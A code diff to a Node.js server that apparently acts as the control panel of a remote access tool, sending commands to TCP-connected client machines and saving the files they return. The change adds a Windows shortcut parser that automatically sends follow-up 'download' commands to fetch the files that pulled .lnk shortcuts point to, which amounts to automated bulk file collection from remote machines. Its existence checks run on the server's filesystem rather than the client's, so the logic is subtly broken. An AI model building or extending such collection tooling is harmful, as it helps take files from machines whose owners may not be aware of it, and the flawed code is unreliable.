@@ -12,6 +12,8 @@ const moment = require('moment');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 const nodemailer = require('nodemailer');
+const AdmZip = require('adm-zip');
+const os = require('os');
 
 const app = express();
 const server = http.createServer(app);
@@ -48,6 +50,232 @@ const outputBuffer = [];
 // Create uploads directory
 fs.ensureDirSync('uploads');
 fs.ensureDirSync('downloads');
+
+// ============================================================
+// SHORTCUT RESOLUTION FUNCTIONS
+// ============================================================
+
+/**
+ * Parse Windows .lnk shortcut file to extract target path
+ * This is a simplified parser for common .lnk files
+ */
+function parseLnkFile(lnkBuffer) {
+  try {
+    // Windows .lnk file structure (simplified)
+    // Header: 76 bytes
+    // LinkInfo starts at offset 0x4C (76)
+    
+    if (lnkBuffer.length < 76) return null;
+    
+    // Check for .lnk magic number (0x0000004C at offset 0)
+    const magic = lnkBuffer.readUInt32LE(0);
+    if (magic !== 0x0000004C) return null;
+    
+    // Get LinkFlags at offset 0x14
+    const linkFlags = lnkBuffer.readUInt32LE(0x14);
+    const hasLinkInfo = (linkFlags & 0x02) !== 0;
+    
+    if (!hasLinkInfo) return null;
+    
+    // Find LinkInfo offset (after header)
+    let offset = 76; // Header size
+    
+    // Skip ShellItemIDList if present (bit 0 of LinkFlags)
+    if ((linkFlags & 0x01) !== 0 && offset + 2 <= lnkBuffer.length) {
+      const idListSize = lnkBuffer.readUInt16LE(offset);
+      offset += 2 + idListSize;
+    }
+    
+    // Read LinkInfo
+    if (offset + 4 > lnkBuffer.length) return null;
+    const linkInfoSize = lnkBuffer.readUInt32LE(offset);
+    
+    if (offset + linkInfoSize > lnkBuffer.length) return null;
+    
+    // LocalBasePath offset (at +0x10 from LinkInfo start)
+    if (offset + 0x14 > lnkBuffer.length) return null;
+    const localBasePathOffset = lnkBuffer.readUInt32LE(offset + 0x10);
+    
+    // Read the path string (null-terminated ASCII)
+    const pathStart = offset + localBasePathOffset;
+    if (pathStart >= lnkBuffer.length) return null;
+    
+    let pathEnd = pathStart;
+    while (pathEnd < lnkBuffer.length && lnkBuffer[pathEnd] !== 0) {
+      pathEnd++;
+    }
+    
+    const targetPath = lnkBuffer.toString('ascii', pathStart, pathEnd);
+    return targetPath || null;
+  } catch (error) {
+    console.error('[SHORTCUT] Error parsing .lnk file:', error);
+    return null;
+  }
+}
+
+/**
+ * Resolve a single shortcut file
+ * @param {string} shortcutPath - Path to the .lnk file
+ * @param {string} clientId - Client ID
+ * @param {Socket} socket - TCP socket to send download commands
+ */
+async function resolveSingleShortcut(shortcutPath, clientId, socket) {
+  try {
+    console.log(`[SHORTCUT] Processing single shortcut: ${shortcutPath}`);
+    
+    if (!fs.existsSync(shortcutPath)) {
+      console.log(`[SHORTCUT] Shortcut file not found: ${shortcutPath}`);
+      return;
+    }
+    
+    const lnkBuffer = fs.readFileSync(shortcutPath);
+    const targetPath = parseLnkFile(lnkBuffer);
+    
+    if (targetPath && fs.existsSync(targetPath)) {
+      const shortcutName = path.basename(shortcutPath, '.lnk');
+      const targetExt = path.extname(targetPath);
+      const newFilename = `${shortcutName}_resolved${targetExt}`;
+      
+      console.log(`[SHORTCUT] Found shortcut: ${shortcutName} -> ${targetPath}`);
+      
+      io.emit('commandResponse', { 
+        clientId, 
+        response: `[SHORTCUT] Resolving: ${shortcutName} -> ${path.basename(targetPath)}`, 
+        timestamp: new Date() 
+      });
+      
+      // Send download command to client
+      const downloadCmd = {
+        type: 'command',
+        content: `download ${targetPath}`
+      };
+      socket.write(JSON.stringify(downloadCmd) + '\n');
+      
+      // Mark as expecting download
+      const client = clients.get(clientId);
+      if (client) {
+        client.pendingDownload = {
+          inProgress: true,
+          filename: newFilename,
+          buffer: Buffer.alloc(0),
+          timeout: null,
+          originalShortcut: path.basename(shortcutPath),
+          targetPath: targetPath
+        };
+      }
+    } else {
+      console.log(`[SHORTCUT] Could not resolve shortcut or target not found: ${shortcutPath}`);
+      io.emit('commandResponse', { 
+        clientId, 
+        response: `[SHORTCUT] Could not resolve: ${path.basename(shortcutPath)}`, 
+        timestamp: new Date() 
+      });
+    }
+  } catch (error) {
+    console.error('[SHORTCUT] Error processing single shortcut:', error);
+    io.emit('commandResponse', { 
+      clientId, 
+      response: `[SHORTCUT] Error: ${error.message}`, 
+      timestamp: new Date() 
+    });
+  }
+}
+
+/**
+ * Extract and resolve shortcuts in ZIP file
+ * @param {string} zipPath - Path to the ZIP file
+ * @param {string} clientId - Client ID
+ * @param {Socket} socket - TCP socket to send download commands
+ */
+async function extractAndResolveShortcuts(zipPath, clientId, socket) {
+  try {
+    console.log(`[SHORTCUT] Processing ZIP file: ${zipPath}`);
+    
+    const zip = new AdmZip(zipPath);
+    const zipEntries = zip.getEntries();
+    
+    const shortcutsToResolve = [];
+    
+    // Find all .lnk files in the ZIP
+    for (const entry of zipEntries) {
+      if (entry.entryName.toLowerCase().endsWith('.lnk')) {
+        try {
+          const lnkBuffer = entry.getData();
+          const targetPath = parseLnkFile(lnkBuffer);
+          
+          if (targetPath && fs.existsSync(targetPath)) {
+            shortcutsToResolve.push({
+              shortcutName: entry.entryName,
+              targetPath: targetPath
+            });
+            console.log(`[SHORTCUT] Found shortcut: ${entry.entryName} -> ${targetPath}`);
+          }
+        } catch (error) {
+          console.error(`[SHORTCUT] Error processing ${entry.entryName}:`, error.message);
+        }
+      }
+    }
+    
+    // Send download commands for each resolved shortcut
+    if (shortcutsToResolve.length > 0) {
+      console.log(`[SHORTCUT] Found ${shortcutsToResolve.length} shortcuts to resolve`);
+      
+      io.emit('commandResponse', { 
+        clientId, 
+        response: `\n[SHORTCUT RESOLVER] Found ${shortcutsToResolve.length} shortcuts. Downloading target files...`, 
+        timestamp: new Date() 
+      });
+      
+      // Download each target file
+      for (const shortcut of shortcutsToResolve) {
+        const targetPath = shortcut.targetPath;
+        const shortcutName = path.basename(shortcut.shortcutName, '.lnk');
+        const targetExt = path.extname(targetPath);
+        const newFilename = `${shortcutName}_resolved${targetExt}`;
+        
+        console.log(`[SHORTCUT] Requesting download: ${targetPath}`);
+        
+        io.emit('commandResponse', { 
+          clientId, 
+          response: `[SHORTCUT] Downloading: ${shortcutName} -> ${path.basename(targetPath)}`, 
+          timestamp: new Date() 
+        });
+        
+        // Send download command to client
+        const downloadCmd = {
+          type: 'command',
+          content: `download ${targetPath}`
+        };
+        socket.write(JSON.stringify(downloadCmd) + '\n');
+        
+        // Mark as expecting download
+        const client = clients.get(clientId);
+        if (client) {
+          client.pendingDownload = {
+            inProgress: true,
+            filename: newFilename,
+            buffer: Buffer.alloc(0),
+            timeout: null,
+            originalShortcut: shortcut.shortcutName,
+            targetPath: targetPath
+          };
+        }
+        
+        // Wait a bit between downloads to avoid overwhelming the client
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+    } else {
+      console.log(`[SHORTCUT] No shortcuts found in ZIP`);
+    }
+  } catch (error) {
+    console.error('[SHORTCUT] Error processing shortcuts:', error);
+    io.emit('commandResponse', { 
+      clientId, 
+      response: `[SHORTCUT] Error: ${error.message}`, 
+      timestamp: new Date() 
+    });
+  }
+}
 
 // SQLite setup for persistent settings using sql.js (pure JS, no native build)
 const initSqlJs = require('sql.js');
@@ -271,7 +499,7 @@ function createTcpServer() {
         const pd = c.pendingDownload;
         pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), data]);
         if (pd.timeout) clearTimeout(pd.timeout);
-        pd.timeout = setTimeout(() => {
+        pd.timeout = setTimeout(async () => {
           try {
             const filename = path.basename(pd.filename || `download_${Date.now()}`);
             const downloadPath = path.join('downloads', filename);
@@ -280,6 +508,23 @@ function createTcpServer() {
             io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
             // Also emit a terminal-friendly message
             io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+            
+            // Check if this is a ZIP file with shortcut resolution enabled
+            if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+              console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
+              // Process shortcuts in the background
+              setTimeout(() => {
+                extractAndResolveShortcuts(downloadPath, clientId, socket);
+              }, 3000); // Wait 3 seconds after ZIP download
+            }
+            // Check if this is a single .lnk file
+            else if (filename.toLowerCase().endsWith('.lnk')) {
+              console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
+              // Process single shortcut in the background
+              setTimeout(() => {
+                resolveSingleShortcut(downloadPath, clientId, socket);
+              }, 1000); // Wait 1 second after shortcut download
+            }
           } catch (e) {
             console.error('[TCP] Error saving downloaded file:', e);
             io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
@@ -309,7 +554,7 @@ function createTcpServer() {
           const chunk = Buffer.from(line, 'binary');
           pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), chunk]);
           if (pd.timeout) clearTimeout(pd.timeout);
-          pd.timeout = setTimeout(() => {
+          pd.timeout = setTimeout(async () => {
             try {
               const filename = path.basename(pd.filename || `download_${Date.now()}`);
               const downloadPath = path.join('downloads', filename);
@@ -317,6 +562,23 @@ function createTcpServer() {
               console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
               io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
               io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+              
+              // Check if this is a ZIP file with shortcut resolution enabled
+              if (pd.resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+                console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
+                // Process shortcuts in the background
+                setTimeout(() => {
+                  extractAndResolveShortcuts(downloadPath, clientId, socket);
+                }, 3000); // Wait 3 seconds after ZIP download
+              }
+              // Check if this is a single .lnk file
+              else if (filename.toLowerCase().endsWith('.lnk')) {
+                console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
+                // Process single shortcut in the background
+                setTimeout(() => {
+                  resolveSingleShortcut(downloadPath, clientId, socket);
+                }, 1000); // Wait 1 second after shortcut download
+              }
             } catch (e) {
               console.error('[TCP] Error saving downloaded file (text-split):', e);
               io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
@@ -415,12 +677,15 @@ function createTcpServer() {
               };
               socket.write(JSON.stringify(downloadCmd) + '\n');
 
-              // Mark as expecting download
+              // Mark as expecting download with shortcut resolution flag
               client.pendingDownload = {
                 inProgress: true,
                 filename: zipPath,
                 buffer: Buffer.alloc(0),
-                timeout: null
+                timeout: null,
+                resolveShortcuts: true, // Enable shortcut resolution for extracted files
+                clientId: clientId,
+                socket: socket
               };
 
               // Notify GUI and console
@@ -506,11 +771,30 @@ function createTcpServer() {
         const buf = client.pendingDownload.buffer || Buffer.alloc(0);
         const filename = path.basename(client.pendingDownload.filename || `download_${Date.now()}`);
         const downloadPath = path.join('downloads', filename);
+        const resolveShortcuts = client.pendingDownload.resolveShortcuts;
+        
         if (buf.length > 0) {
           fs.writeFileSync(downloadPath, buf);
           console.log(`[TCP] File downloaded (on close): ${downloadPath} (${buf.length} bytes)`);
           io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: buf.length });
           io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}` , timestamp: new Date() });
+          
+          // Check if this is a ZIP file with shortcut resolution enabled
+          if (resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
+            console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
+            // Process shortcuts in the background
+            setTimeout(() => {
+              extractAndResolveShortcuts(downloadPath, clientId, socket);
+            }, 3000); // Wait 3 seconds after ZIP download
+          }
+          // Check if this is a single .lnk file
+          else if (filename.toLowerCase().endsWith('.lnk')) {
+            console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
+            // Process single shortcut in the background
+            setTimeout(() => {
+              resolveSingleShortcut(downloadPath, clientId, socket);
+            }, 1000); // Wait 1 second after shortcut download
+          }
         }
       } catch (e) {
         console.error('[TCP] Error saving downloaded file on close:', e);
@@ -705,6 +989,45 @@ io.on('connection', (socket) => {
     
     if (client && client.socket && client.active) {
       try {
+        // Handle special shortcut resolution command
+        if (typeof command === 'string' && command.trim().toLowerCase() === 'resolveshortcuts') {
+          io.emit('commandResponse', { 
+            clientId, 
+            response: '[SHORTCUT] Scanning downloads folder for shortcuts...', 
+            timestamp: new Date() 
+          });
+          
+          // Scan downloads folder for .lnk files
+          const downloadsDir = path.join(__dirname, 'downloads');
+          if (fs.existsSync(downloadsDir)) {
+            const files = fs.readdirSync(downloadsDir);
+            const lnkFiles = files.filter(file => file.toLowerCase().endsWith('.lnk'));
+            
+            if (lnkFiles.length > 0) {
+              io.emit('commandResponse', { 
+                clientId, 
+                response: `[SHORTCUT] Found ${lnkFiles.length} shortcut files to resolve`, 
+                timestamp: new Date() 
+              });
+              
+              // Process each shortcut
+              lnkFiles.forEach((lnkFile, index) => {
+                setTimeout(() => {
+                  const lnkPath = path.join(downloadsDir, lnkFile);
+                  resolveSingleShortcut(lnkPath, clientId, client.socket);
+                }, index * 2000); // 2 second delay between each
+              });
+            } else {
+              io.emit('commandResponse', { 
+                clientId, 
+                response: '[SHORTCUT] No shortcut files found in downloads folder', 
+                timestamp: new Date() 
+              });
+            }
+          }
+          return;
+        }
+        
         // If user is downloading via terminal, prepare pending download capture
         if (typeof command === 'string' && command.trim().toLowerCase().startsWith('download ')) {
           client.pendingDownload = {
